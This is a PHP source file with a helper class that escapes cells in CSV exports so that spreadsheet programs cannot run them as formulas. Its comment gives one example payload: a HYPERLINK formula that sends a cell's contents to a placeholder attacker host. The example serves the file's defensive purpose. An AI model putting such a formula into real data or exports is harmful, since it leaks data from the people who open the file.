<?php

namespace App\Support;

/**
 * CSV output that is safe to open in Excel / LibreOffice / Google Sheets
 * (Phase 2, F13).
 *
 * A cell that starts with = + - @ or a tab / carriage return is run as a
 * formula by spreadsheet programs. Text typed into the public registration
 * form (or any other field) ends up in staff exports, so a value such as
 * =HYPERLINK("http://evil.example?x="&A2,"Click") would run on a staff
 * computer. Such cells are prefixed with a single quote, which spreadsheets
 * show as plain text. Real numbers (including negatives like -12.50) are
 * left untouched so totals still add up.
 */
class Csv
{
    /** fputcsv() with every cell neutralised. */
    public static function put($handle, array $row): int|false
    {
        return fputcsv($handle, array_map([self::class, 'safe'], $row), ',', '"', '\\');
    }

    public static function safe(mixed $value): mixed
    {
        if (! is_string($value) || $value === '' || is_numeric($value)) {
            return $value;
        }

        // Formatted amounts such as -$1,200.00, -L$500 or -12.5% cannot carry a formula.
        if (preg_match('/^[-+]?(L?\$)?[\d,]+(\.\d+)?%?$/', $value)) {
            return $value;
        }

        return in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true) ? "'".$value : $value;
    }
}
